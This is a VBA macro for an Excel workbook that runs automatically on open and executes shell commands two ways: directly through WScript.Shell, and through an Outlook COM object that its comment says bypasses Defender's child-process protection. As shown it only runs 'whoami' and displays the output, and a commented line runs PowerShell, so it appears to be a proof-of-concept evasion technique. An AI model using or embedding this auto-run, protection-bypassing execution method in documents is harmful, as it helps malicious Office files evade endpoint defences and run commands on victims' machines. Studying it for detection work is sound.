Private Sub Workbook_Open()

    AutoRunMacro  
    AutoRunMacroBypass

End Sub

Sub AutoRunMacro()
   
    ' create shell object
    Set WshShell = CreateObject("WScript.Shell")
    
    'execute the command from the new shell object
    Set WshShellExec = WshShell.Exec("whoami")
    
    'read the output of the command
    MsgBox (WshShellExec.StdOut.ReadAll)
    

End Sub

' Bypass defender chiled process protection using outlook process
Sub AutoRunMacroBypass()

    ' create outlook object
    Set objOL = CreateObject("Outlook.Application")
    
    ' create shell object under the outlook object
    Set WshShell = objOL.CreateObject("Wscript.Shell")
    
    ' exec the command from the new shell object
    Set WshShellExec = WshShell.Exec("whoami")
    
    ' view the process tree
    ' Set WshShellExec = WshShell.Exec("powershell -c sleep 5000")

    ' read the output of the command
    MsgBox (WshShellExec.StdOut.ReadAll)

End Sub

